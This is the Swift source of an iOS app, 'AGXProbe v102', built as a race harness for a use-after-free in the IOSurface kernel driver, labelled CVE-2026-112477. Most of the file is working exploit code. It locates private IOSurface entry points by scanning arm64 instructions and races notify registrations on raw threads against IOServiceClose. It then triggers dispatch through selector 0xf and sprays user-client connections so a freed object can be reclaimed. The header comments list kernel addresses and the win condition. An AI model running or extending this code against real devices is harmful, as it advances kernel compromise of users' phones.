// AGXProbe v102 - CVE-2026-112477 race harness, selector 0xf trigger
//
// v101 result: 50 iterations clean, but the bare-surface trigger produced 0
// control messages.  IOSurface objects are cached, so a plain CFRelease never
// finalizes -> dispatchNotify never runs.  The dominant set error was
// 0x10000003 (MACH_SEND_INVALID_DEST), i.e. calls made after IOServiceClose,
// not duplicates.
//
// v102:
//   * real trigger = external method selector 0xf, handler 0xa34d510:
//         selector 0xf(slot, flag) -> lookup(client, slot)
//         -> if the entry exists: 0xa33d314(entry, flag)
//         -> if that gates true: drain(entry->root, flag) -> dispatchNotify
//     slot is 1-based into the connection's notify table; the 512 connB
//     registrations allocate slots 1..512.  flag is the event (0 or 1).
//   * --iters=0 runs only the trigger probe (no victim race), so the trigger
//     can be validated without a dangling node in the root list.
//   * the out struct of each connB set is logged (slot index).
//
// Win condition unchanged: a victim registration that survives IOServiceClose
// makes dispatchNotify touch a freed client -> message on the victim port
// (read succeeded) or a panic (PAC/auth failure).  Read-or-panic, not r/w.
//
// v100 design (kept):
//   * set-only threads (no removes), each thread walking a private slice of a
//     large surface pool, so every successful set is a fresh registration,
//   * TWO notify ports:
//       portD - registered by the long-lived connB (control),
//       port  - registered only by the victim connections.
//
// Path under test (27.0.1 / 24A446):
//   selector 0x11 -> register(root, port, key, client)   0xfffffe000a3460f0
//   dispatchNotify(root, event)                          0xfffffe000a3462f0
//   notifyOne(client, node, event, idx)                  0xfffffe000a34ff48
//   unlinkByObject(root, client)                         0xfffffe000a346364  (LAST)
//   surface finalize                                     0xfffffe000a33c694

import SwiftUI
import Darwin
import Foundation
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v102 - notify race").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runRaceMode() } }) {
                Text(vm.isRunning ? "Running..." : "Run v102 race")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.red).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

// ---- function shapes --------------------------------------------------------
typealias SetWrapFn = @convention(c) (UInt32, UInt32, UInt64, UnsafeRawPointer?, UInt32,
                                      UInt64, UInt64, UnsafeRawPointer?,
                                      UInt64, UInt64, UInt64, UInt64, UInt64) -> Int32
typealias RemWrapFn = @convention(c) (UInt32, UInt32, UInt64, UInt64, UnsafeRawPointer?,
                                      UInt64, UInt64, UInt64, UInt64, UInt64) -> Int32
typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t
typealias RemoveNotifyFn = @convention(c) (UInt64) -> kern_return_t
typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32
typealias MethodFn = @convention(c) (UInt32, UInt32, UnsafePointer<UInt64>?, UInt32,
                                     UnsafeRawPointer?, Int,
                                     UnsafeMutablePointer<UInt64>?, UnsafeMutablePointer<UInt32>?,
                                     UnsafeMutableRawPointer?, UnsafeMutablePointer<Int>?) -> Int32

// ---- shared race context (touched from raw threads) -------------------------
final class RaceCtx {
    var conn: UInt32 = 0
    var stop: Int32 = 0
    var done: Int32 = 0
    var ops: Int = 0
    var okSet: Int = 0
    var errSet: Int = 0
    var lastErr: Int32 = 0
    var port: UInt32 = 0
    var ids: [UInt32] = []
    var tid: Int = 0
    var nthreads: Int = 1
    var setWrap: SetWrapFn? = nil
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        let args = ProcessInfo.processInfo.arguments
        if args.contains("--race") { await runRaceMode(); return }
        if args.contains("--brotli") {
            emit("[br] CVE-2026-111497 repro, iOS " + ProcessInfo.processInfo.operatingSystemVersionString)
            let rc = BrotliRepro.run { self.emit($0) }
            emit("[br] rc=\(rc)")
            return
        }
        if args.contains("--autorun") { await runProbe() }
    }

    // ---- tiny arm64 helpers --------------------------------------------------
    func read32(_ addr: UInt64) -> UInt32? {
        guard let p = UnsafeRawPointer(bitPattern: Int(bitPattern: UInt(truncatingIfNeeded: addr))) else { return nil }
        let b = p.assumingMemoryBound(to: UInt8.self)
        return UInt32(b[0]) | (UInt32(b[1]) << 8) | (UInt32(b[2]) << 16) | (UInt32(b[3]) << 24)
    }
    func hexbytes(_ addr: UInt64, _ n: Int) -> String {
        guard let p = UnsafeRawPointer(bitPattern: Int(bitPattern: UInt(truncatingIfNeeded: addr))) else { return "?" }
        let b = p.assumingMemoryBound(to: UInt8.self)
        var s = ""
        for i in 0..<n { s += String(format: "%02x ", b[i]) }
        return s
    }
    func blTarget(_ word: UInt32, _ pc: UInt64) -> UInt64 {
        var imm = Int64(word & 0x03FFFFFF)
        if (imm & 0x02000000) != 0 { imm -= 0x04000000 }
        return UInt64(bitPattern: Int64(pc) &+ (imm &* 4))
    }
    func stubTarget(_ adrp: UInt32, _ add: UInt32, _ pc: UInt64) -> UInt64 {
        let immhi = UInt64((adrp >> 5) & 0x7FFFF)
        let immlo = UInt64((adrp >> 29) & 0x3)
        var simm = Int64((immhi << 2) | immlo)
        if (simm & 0x100000) != 0 { simm -= 0x200000 }
        let page = (pc & ~UInt64(0xFFF)) &+ UInt64(bitPattern: simm &* 4096)
        let imm12 = UInt64((add >> 10) & 0xFFF)
        return page &+ imm12
    }
    func isADRP(_ w: UInt32) -> Bool { (w & 0x9F00001F) == 0x90000010 }
    func isADDimm(_ w: UInt32) -> Bool { (w & 0xFF80001F) == 0x91000010 }
    func isBRx16(_ w: UInt32) -> Bool { w == 0xD61F0200 }
    func isBRK1(_ w: UInt32) -> Bool { w == 0xD4200020 }
    func isPACIBSP(_ w: UInt32) -> Bool { w == 0xD503237F }

    struct WrapperCandidate { let stub: UInt64; let real: UInt64; let words: [UInt32] }

    func findWrapperCalls(_ fnAddr: UInt64, _ span: Int) -> [WrapperCandidate] {
        var found: [WrapperCandidate] = []
        for off in stride(from: 0, to: span, by: 4) {
            guard let w = read32(fnAddr &+ UInt64(off)) else { continue }
            guard (w & 0xFC000000) == 0x94000000 else { continue }
            let stub = blTarget(w, fnAddr &+ UInt64(off))
            guard let w0 = read32(stub), let w1 = read32(stub &+ 4),
                  let w2 = read32(stub &+ 8), let w3 = read32(stub &+ 12) else { continue }
            guard isADRP(w0), isADDimm(w1), isBRx16(w2), isBRK1(w3) else { continue }
            let real = stubTarget(w0, w1, stub)
            guard let r0 = read32(real), isPACIBSP(r0) else { continue }
            var ws: [UInt32] = []
            for i in 0..<8 {
                if let x = read32(real &+ UInt64(i * 4)) { ws.append(x) } else { break }
            }
            found.append(WrapperCandidate(stub: stub, real: real, words: ws))
        }
        return found
    }
    func matchesPrologue(_ c: WrapperCandidate, _ expected: [UInt32]) -> Bool {
        guard c.words.count >= expected.count else { return false }
        for i in 0..<expected.count { if c.words[i] != expected[i] { return false } }
        return true
    }
    func dumpCandidates(_ label: String, _ cands: [WrapperCandidate]) {
        emit("  [\(label)] \(cands.count) stub candidate(s)")
        for (i, c) in cands.enumerated() {
            var ws = ""
            for w in c.words { ws += String(format: "%08X ", w) }
            emit("   #\(i) stub=0x\(String(c.stub, radix: 16)) real=0x\(String(c.real, radix: 16))")
            emit("       real words = \(ws)")
        }
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v102 - stub (use --race) ===")
        status = "Complete"; isRunning = false
    }

    // ---- raise the receive queue so a dispatch burst is not dropped ---------
    func setQLimit(_ p: mach_port_t, _ n: Int) {
        var limits = mach_port_limits_t(mpl_qlimit: mach_msg_type_number_t(n))
        _ = withUnsafeMutablePointer(to: &limits) { lp -> kern_return_t in
            lp.withMemoryRebound(to: integer_t.self, capacity: 2) { ip in
                mach_port_set_attributes(mach_task_self(), p, MACH_PORT_LIMITS_INFO,
                                         ip, mach_msg_type_number_t(MemoryLayout<mach_port_limits_t>.size / MemoryLayout<integer_t>.size))
            }
        }
    }

    // ---- non-blocking receive ------------------------------------------------
    func recvCount(_ p: mach_port_t, limit: Int = 4096) -> Int {
        var n = 0
        var buf = [UInt32](repeating: 0, count: 256)
        while n < limit {
            let kr: kern_return_t = buf.withUnsafeMutableBytes { raw -> kern_return_t in
                let h = raw.baseAddress!.assumingMemoryBound(to: mach_msg_header_t.self)
                h.pointee.msgh_bits = 0
                h.pointee.msgh_size = mach_msg_size_t(raw.count)
                h.pointee.msgh_local_port = p
                h.pointee.msgh_remote_port = 0
                return mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                mach_msg_size_t(raw.count), p, 0, 0)
            }
            if kr != KERN_SUCCESS { break }
            n += 1
        }
        return n
    }

    // ---- v100 race -----------------------------------------------------------
    func runRaceMode() async {
        isRunning = true; status = "Racing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v102 - CVE-2026-112477 race ===")
        emit("iOS " + ProcessInfo.processInfo.operatingSystemVersionString)
        try? await Task.sleep(nanoseconds: 1_000_000_000)

        var iters = 200
        var reqPool = 512
        var victimPool = 256
        var drainPerIter = 2
        var nThreads = 2
        var closeDelayUS = 0
        for a in ProcessInfo.processInfo.arguments {
            if a.hasPrefix("--iters="), let v = Int(a.dropFirst(8)) { iters = v }
            if a.hasPrefix("--reqpool="), let v = Int(a.dropFirst(10)) { reqPool = v }
            if a.hasPrefix("--victims="), let v = Int(a.dropFirst(10)) { victimPool = v }
            if a.hasPrefix("--drains="), let v = Int(a.dropFirst(9)) { drainPerIter = v }
            if a.hasPrefix("--threads="), let v = Int(a.dropFirst(10)) { nThreads = v }
            if a.hasPrefix("--delay="), let v = Int(a.dropFirst(8)) { closeDelayUS = v }
        }
        emit("iters=\(iters) reqpool=\(reqPool) victims=\(victimPool) drains/iter=\(drainPerIter) threads=\(nThreads) delay=\(closeDelayUS)us")

        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
              let setSym = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let remSym = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify"),
              let createSym = dlsym(fwH, "IOSurfaceCreate"),
              let getIdSym = dlsym(fwH, "IOSurfaceGetID") else {
            emit("[-] dlsym fail"); status = "Complete"; isRunning = false; return
        }
        let gCreate = unsafeBitCast(createSym, to: CreateFn.self)
        let gGetID = unsafeBitCast(getIdSym, to: GetIDFn.self)
        let gSet = unsafeBitCast(setSym, to: SetNotifyFn.self)
        let gRemove = unsafeBitCast(remSym, to: RemoveNotifyFn.self)

        guard let iokitH = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW),
              let cmSym = dlsym(iokitH, "IOConnectCallMethod") else {
            emit("[-] IOConnectCallMethod dlsym fail"); status = "Complete"; isRunning = false; return
        }
        let gCallMethod = unsafeBitCast(cmSym, to: MethodFn.self)

        func krName(_ kr: Int32) -> String {
            switch kr {
            case KERN_SUCCESS: return "OK"
            case Int32(bitPattern: 0xe00002bd): return "NoMemory"
            case Int32(bitPattern: 0xe00002c1): return "BadMatching"
            case Int32(bitPattern: 0xe00002c2): return "BadArgument"
            case Int32(bitPattern: 0xe00002c9): return "Duplicate"
            case Int32(bitPattern: 0xe00002d8): return "NotAttached"
            default: return String(format: "0x%08x", UInt32(bitPattern: kr))
            }
        }
        func makeSurface(w: Int, h: Int) -> UnsafeMutableRawPointer? {
            var keyCB = kCFTypeDictionaryKeyCallBacks
            var valCB = kCFTypeDictionaryValueCallBacks
            let props = CFDictionaryCreateMutable(nil, 0, &keyCB, &valCB) as! NSMutableDictionary
            props["IOSurfaceWidth"] = w
            props["IOSurfaceHeight"] = h
            props["IOSurfaceBytesPerElement"] = 4
            return gCreate(props)
        }

        // ---- 1. resolve the two IOKit entry points ---------------------------
        emit("\n=== 1. runtime wrapper discovery ===")
        var infoIOS = Dl_info()
        var infoIOR = Dl_info()
        _ = dladdr(setSym, &infoIOS)
        _ = dladdr(remSym, &infoIOR)
        guard infoIOS.dli_saddr != nil, infoIOR.dli_saddr != nil else {
            emit("[-] dladdr failed"); status = "Complete"; isRunning = false; return
        }
        let setFn = unsafeBitCast(infoIOS.dli_saddr!, to: UInt64.self)
        let remFn = unsafeBitCast(infoIOR.dli_saddr!, to: UInt64.self)
        let setPrologue: [UInt32] = [0xD503237F, 0xD10203FF, 0xA9064FF4, 0xA9077BFD,
                                     0x9101C3FD, 0xAA0703E9, 0xAA0203EA, 0xAA0103E8]
        let remPrologue: [UInt32] = [0xD503237F, 0xD101C3FF, 0xA9054FF4, 0xA9067BFD,
                                     0x910183FD, 0xAA0703E9, 0xAA0603E8, 0xAA0503EA]
        let setCands = findWrapperCalls(setFn, 0x120)
        let remCands = findWrapperCalls(remFn, 0x120)
        dumpCandidates("set", setCands)
        dumpCandidates("remove", remCands)
        var setHits = setCands.filter { matchesPrologue($0, setPrologue) }
        var remHits = remCands.filter { matchesPrologue($0, remPrologue) }
        if setHits.isEmpty { setHits = setCands.filter { $0.words.count >= 2 && $0.words[0] == 0xD503237F && $0.words[1] == 0xD10203FF } }
        if remHits.isEmpty { remHits = remCands.filter { $0.words.count >= 2 && $0.words[0] == 0xD503237F && $0.words[1] == 0xD101C3FF } }
        guard setHits.count >= 1, remHits.count >= 1 else {
            emit("[-] wrapper discovery failed"); status = "Complete"; isRunning = false; return
        }
        let setWrap = unsafeBitCast(setHits[0].stub, to: SetWrapFn.self)
        let remWrap = unsafeBitCast(remHits[0].stub, to: RemWrapFn.self)
        emit("set   stub=0x\(String(setHits[0].stub, radix: 16)) real=0x\(String(setHits[0].real, radix: 16))")
        emit("rem   stub=0x\(String(remHits[0].stub, radix: 16)) real=0x\(String(remHits[0].real, radix: 16))")

        // ---- 2. open connections ---------------------------------------------
        emit("\n=== 2. open connections ===")
        var iter: io_iterator_t = 0
        var kr: Int32 = "IOSurfaceRoot".withCString {
            xq_IOServiceGetMatchingServices(0, xq_IOServiceMatching($0), &iter)
        }
        guard kr == KERN_SUCCESS else { emit("[-] matching failed"); status = "Complete"; isRunning = false; return }
        let svc = xq_IOIteratorNext(iter)
        emit("service = 0x\(String(svc, radix: 16))")
        func openConn() -> io_connect_t {
            var c: io_connect_t = 0
            _ = xq_IOServiceOpen(svc, mach_task_self(), 0, &c)
            return c
        }
        let connB = openConn()
        emit("drain conn = 0x\(String(connB, radix: 16))")
        guard connB != 0 else { emit("[-] open failed"); status = "Complete"; isRunning = false; return }

        var port: mach_port_t = 0
        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port)
        setQLimit(port, 1024)
        emit("victim port 0x\(String(port, radix: 16)) kr=\(krName(kr))")
        guard kr == KERN_SUCCESS else { status = "Complete"; isRunning = false; return }
        var portD: mach_port_t = 0
        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &portD)
        setQLimit(portD, 1024)
        emit("drain  port 0x\(String(portD, radix: 16)) kr=\(krName(kr))")

        // ---- 3. long root-global list on connB (bound to portD) --------------
        emit("\n=== 3. build root-global request list (\(reqPool)) ===")
        var reqSurfaces: [UnsafeMutableRawPointer] = []
        var reqIds: [UInt32] = []
        for i in 0..<reqPool {
            guard let s = makeSurface(w: 16, h: 16) else { break }
            let id = gGetID(s)
            var inSet: (UInt64, UInt64, UInt64) = (UInt64(portD), 1, UInt64(id))
            var outSet: (UInt64, UInt64, UInt64) = (1, UInt64(id), 0)
            let r: Int32 = withUnsafePointer(to: &inSet) { ip in
                withUnsafePointer(to: &outSet) { op in
                    setWrap(connB, 0x11, UInt64(portD), UnsafeRawPointer(ip), 3, 0, 0,
                            UnsafeRawPointer(op), 0x18, 0, 0, 0, 0)
                }
            }
            if r == 0 {
                reqSurfaces.append(s); reqIds.append(id)
                if i < 3 { emit("  set[\(i)] id=0x\(String(id, radix: 16)) OK out=(\(outSet.0),\(outSet.1),\(outSet.2))") }
            }
            else {
                Unmanaged<AnyObject>.fromOpaque(s).release()
                if i < 3 { emit("  set[\(i)] id=0x\(String(id, radix: 16)) -> \(krName(r))") }
            }
        }
        emit("registered \(reqIds.count)/\(reqPool) requests on connB")

        // ---- 4. victim surface pool ------------------------------------------
        var vs: [UnsafeMutableRawPointer] = []
        var vi: [UInt32] = []
        for _ in 0..<victimPool {
            guard let s = makeSurface(w: 16, h: 16) else { break }
            vs.append(s); vi.append(gGetID(s))
        }
        let victimSurfaces = vs
        let victimIds = vi
        emit("victim surface pool = \(victimIds.count)")

        // ---- 5. trigger: selector 0xf(slot, flag) -> drain -> dispatchNotify -
        emit("\n=== 5. selector 0xf trigger control ===")
        var triggerOK = 0
        var triggerFail = 0
        func triggerSlot(_ slot: Int, _ flag: UInt64) -> Int32 {
            var sc: [UInt64] = [UInt64(slot), flag]
            let rc: Int32 = sc.withUnsafeBufferPointer { bp in
                gCallMethod(connB, 0xf, bp.baseAddress, 2, nil, 0, nil, nil, nil, nil)
            }
            if rc == 0 { triggerOK += 1 } else { triggerFail += 1 }
            return rc
        }
        for slot in [1, 2, 3, 4, 8, 16, 64, reqIds.count] {
            if slot < 1 { continue }
            let rc0 = triggerSlot(slot, 0)
            let c0 = recvCount(portD)
            let rc1 = triggerSlot(slot, 1)
            let c1 = recvCount(portD)
            emit("slot \(slot): flag0 rc=\(krName(rc0)) ctl=\(c0) | flag1 rc=\(krName(rc1)) ctl=\(c1)")
        }

        // ---- 6. race loop ----------------------------------------------------
        emit("\n=== 6. race: set-only vs IOServiceClose ===")
        let ctx = RaceCtx()
        ctx.port = port
        ctx.ids = victimIds
        ctx.nthreads = nThreads
        ctx.setWrap = setWrap

        var totalOps = 0
        var totalOKSet = 0
        var totalErrSet = 0
        var totalCtl = 0
        var totalStale = 0
        var staleIters: [Int] = []
        if iters > 0 {
        for i in 1...iters {
            let c = openConn()
            if c == 0 { continue }
            ctx.conn = c
            ctx.stop = 0
            ctx.done = 0
            ctx.ops = 0
            ctx.okSet = 0; ctx.errSet = 0

            var threads: [Thread] = []
            for t in 0..<max(1, nThreads) {
                let th = Thread { raceLoop(ctx, tid: t, nthreads: nThreads) }
                th.stackSize = 1 << 20
                threads.append(th)
            }
            for t in threads { t.start() }

            if closeDelayUS > 0 { usleep(UInt32(closeDelayUS)) }
            _ = xq_IOServiceClose(c)          // <-- the teardown race
            ctx.stop = 1

            var spins = 0
            while ctx.done < Int32(threads.count) && spins < 20000 { usleep(50); spins += 1 }
            totalOps += ctx.ops
            totalOKSet += ctx.okSet
            totalErrSet += ctx.errSet

            var trigCtl = 0
            for _ in 0..<max(1, drainPerIter) {
                let slot = 1 + (i % max(1, reqIds.count))
                _ = triggerSlot(slot, 1)
                trigCtl += recvCount(portD)
            }

            // control: connB registrations fire on every trigger
            let ctl = trigCtl
            // win: any victim registration that outlived its client
            let stale = recvCount(port)
            totalCtl += ctl
            if stale > 0 {
                totalStale += stale
                if staleIters.count < 20 { staleIters.append(i) }
                emit("  *** iter \(i): \(stale) notification(s) on the VICTIM port after close ***")
            }

            // churn the user-client zone so a freed client can be reclaimed
            var spray: [io_connect_t] = []
            for _ in 0..<4 { let s = openConn(); if s != 0 { spray.append(s) } }
            for s in spray { _ = xq_IOServiceClose(s) }

            if i % 5 == 0 || i <= 3 {
                emit("[\(i)/\(iters)] ops=\(totalOps) setOK=\(totalOKSet) setErr=\(totalErrSet) lastErr=\(krName(ctx.lastErr)) ctl=\(totalCtl) stale=\(totalStale) trig=\(triggerOK)/\(triggerOK + triggerFail)")
            }
            if i % 25 == 0 { try? await Task.sleep(nanoseconds: 20_000_000) }
        }
        }

        emit("\n=== done: \(iters) iterations, \(totalOps) sets, setOK=\(totalOKSet) setErr=\(totalErrSet) lastErr=\(krName(ctx.lastErr)) ===")
        emit("triggers: ok=\(triggerOK) fail=\(triggerFail)")
        emit("control notifications: \(totalCtl)   VICTIM notifications: \(totalStale)")
        if !staleIters.isEmpty { emit("stale at iterations: \(staleIters)") }
        for s in victimSurfaces { Unmanaged<AnyObject>.fromOpaque(s).release() }
        for s in reqSurfaces { Unmanaged<AnyObject>.fromOpaque(s).release() }
        _ = xq_IOServiceClose(connB)
        status = "Complete"; isRunning = false
    }
}

// ---- raw thread body (no Swift concurrency, no actor isolation) --------------
private func raceLoop(_ ctx: RaceCtx, tid: Int, nthreads: Int) {
    let ids = ctx.ids
    let port = ctx.port
    let stride = max(1, nthreads)
    guard let setWrap = ctx.setWrap else { return }
    var idx = tid
    while ctx.stop == 0 {
        if idx >= ids.count { idx = tid }
        let id = ids[idx]
        idx += stride
        var inSet: (UInt64, UInt64, UInt64) = (UInt64(port), 1, UInt64(id))
        var outSet: (UInt64, UInt64, UInt64) = (1, UInt64(id), 0)
        let rs: Int32 = withUnsafePointer(to: &inSet) { ip in
            withUnsafePointer(to: &outSet) { op in
                setWrap(ctx.conn, 0x11, UInt64(port), UnsafeRawPointer(ip), 3, 0, 0,
                        UnsafeRawPointer(op), 0x18, 0, 0, 0, 0)
            }
        }
        if rs == 0 { ctx.okSet += 1 } else { ctx.errSet += 1; ctx.lastErr = rs }
        ctx.ops += 1
    }
    ctx.done += 1
}

// mach_task_self is not exposed by the Darwin module on iOS
@_silgen_name("mach_task_self")
func mach_task_self() -> mach_port_t
